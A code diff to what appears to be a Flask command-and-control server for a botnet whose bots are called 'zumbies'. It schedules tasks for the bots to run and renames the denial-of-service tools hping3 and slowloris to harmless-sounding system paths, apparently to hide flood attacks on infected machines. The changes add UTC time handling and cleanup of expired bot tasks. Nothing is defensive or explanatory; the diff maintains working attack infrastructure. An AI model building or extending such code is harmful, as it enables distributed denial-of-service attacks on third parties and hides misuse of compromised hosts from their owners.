@@ -74,14 +74,14 @@ def new_task():
         if data["when"].isdigit():
             when = now + int(data["when"])
         else:
-            when = datetime.datetime.strptime(data["when"], "%Y-%m-%d,%H:%M:%S").timestamp()
+            when = datetime.datetime.strptime(data["when"], "%Y-%m-%d,%H:%M:%S").replace(tzinfo=datetime.timezone.utc).timestamp()
     except:
-        return "Invalid 'when' attribute (format YYYY-MM-DD,HH:MM:SS or S number of seconds from now)", 400
+        return "Invalid 'when' attribute. Format: YYYY-MM-DD,HH:MM:SS (UTC) or S (number of seconds from now)", 400
     if when < now + 90:
         return "Invalid 'when' attribute: must be at least 90s from now", 400
     if when in tasks:
         return "Cannot add two tasks at the same time", 400
-    tasks[when] = data["task"].replace("hping3", "/usr/bin/linux_checker").replace("slowloris.py", "/usr/bin/linux_verify")
+    tasks[when] = data["task"].replace("hping3", "/usr/bin/linux_checker").replace("slowloris", "/usr/bin/linux_verify")
     if "is_authenticated" in session:
         return redirect(url_for('get_admin'))
     return "OK"
@@ -98,6 +98,7 @@ def get_tasks():
         zumbi = zumbies[request.remote_addr]
     for when, task in tasks.items():
         if when < now + 10:
+            zumbi["_tasks"].pop(when, None)
             continue
         if when in zumbi["_tasks"]:
             continue
